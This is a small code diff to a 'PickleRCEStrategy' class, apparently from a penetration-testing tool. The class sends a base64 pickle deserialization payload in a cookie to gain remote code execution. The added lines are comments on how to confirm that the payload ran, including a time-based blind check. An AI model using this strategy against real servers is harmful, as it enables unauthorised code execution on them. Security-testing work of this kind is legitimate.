@@ -23,7 +23,12 @@ class PickleRCEStrategy(AbstractStrategy):
             
             cookies = {"vuln_cookie": payload_b64.decode()}
             response = requests.get(self.url, cookies=cookies, timeout=timeout)
-            response.raise_for_status()
+            response.raise_for_status() # Comment this if it always returns something else than 200 or if false state returns something else than 200
+            # Here return True if the payload is executed without errors 
+            # you can base it on the status code and remove raise_for_status above
+            # or you sarch for a specific error message in the response text
+            # or you can parse the response text if you know it does return a specific output at some place
+            # you can also modify your payload to do a timebased, add timeout to request and put a return False in 
             return response.status_code == 200
         except Exception:
             return None
